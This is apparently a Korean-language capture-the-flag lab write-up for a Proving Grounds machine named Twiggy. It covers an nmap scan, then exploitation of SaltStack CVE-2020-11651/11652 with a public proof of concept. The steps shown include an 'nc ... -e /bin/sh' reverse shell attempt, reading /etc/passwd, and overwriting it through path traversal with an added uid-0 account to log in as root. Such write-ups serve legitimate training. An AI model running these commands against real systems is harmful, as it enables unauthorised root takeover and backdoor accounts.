```bash
┌──(kali㉿kali)-[~/PG/Twiggy]
└─$ cat nmap.log
# Nmap 7.98 scan initiated Thu Jun 11 09:39:57 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.189.62
Nmap scan report for 192.168.189.62
Host is up (0.066s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Home | Mezzanine
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Site doesn''t have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (97%), MikroTik RouterOS 7.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   65.86 ms 192.168.45.1
2   65.70 ms 192.168.45.254
3   66.10 ms 192.168.251.1
4   66.34 ms 192.168.189.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 11 09:40:51 2026 -- 1 IP address (1 host up) scanned in 53.45 seconds
```


nmap 결과로 ZeroMQ ZMTP 2.0 사용중을 확인
```bash
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
```

exploit 검색
![[Pasted image 20260611125128.png]]

CVE-2020-11652, CVE-2020-11651 관련 있음을 확인
![[Pasted image 20260611125204.png]]

CVE-2020-11652 exploit 확인인

![[Pasted image 20260611125243.png]]

exploit 동작 확인
```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ python3 exploit.py --master 192.168.189.62
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.189.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
```


![[Pasted image 20260611125348.png]]

RCE 실행 하였지만 실패
```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ python3 exploit.py --master 192.168.189.62 --exec "nc 192.168.45.173 4444 -e /bin/sh"
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.189.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
[+] Attemping to execute nc 192.168.45.173 4444 -e /bin/sh on 192.168.189.62
[+] Successfully scheduled job: 20260611035400329542
```

![[Pasted image 20260611125419.png]]

exploit 기능 내 파일 읽기, 업로드 확안
```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ python3 exploit.py --master 192.168.189.62 -r /etc/passwd
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.189.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
[+] Attemping to read /etc/passwd from 192.168.189.62
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin
```

![[Pasted image 20260611125525.png]]

읽어온 passwd 파일의 내용 추가 후 맨 아래줄에 생성한 계정 추가
```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ openssl passwd a123a123
$1$rdv9F6o9$IfCFDDxwb6oW7J9A.5qdI0
```

![[Pasted image 20260611125947.png]]

계정 추가 완료
```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ cat passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin
qq:$1$rdv9F6o9$IfCFDDxwb6oW7J9A.5qdI0:0:0:root:/root:/bin/bash
```

![[Pasted image 20260611130140.png]]

파일 업로드 시도
```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ python3 exploit.py --master 192.168.189.62 --upload-src passwd --upload-dest ../../../../../etc/passwd
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.189.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
[+] Attemping to upload passwd to ../../../../../etc/passwd on 192.168.189.62
[ ] Wrote data to file /srv/salt/../../../../../etc/passwd
```

자격증명 확인
```bash
┌──(kali㉿kali)-[~/CTF/DEFCON2026]
└─$ ssh qq@192.168.189.62
The authenticity of host '192.168.189.62 (192.168.189.62)' can''t be established.
ED25519 key fingerprint is: SHA256:uYMZFN9vYkxFeoZ23/Znor6lCrABMH4HLFk4qNAIkB4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.189.62' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
qq@192.168.189.62''s password:
[root@twiggy ~]# whoami
root
[root@twiggy ~]# ls
proof.txt
[root@twiggy ~]# cat proof.txt
3fd4954f15b0824c66637cf374e5afd0
[root@twiggy ~]#
```
![[Pasted image 20260611134941.png]]

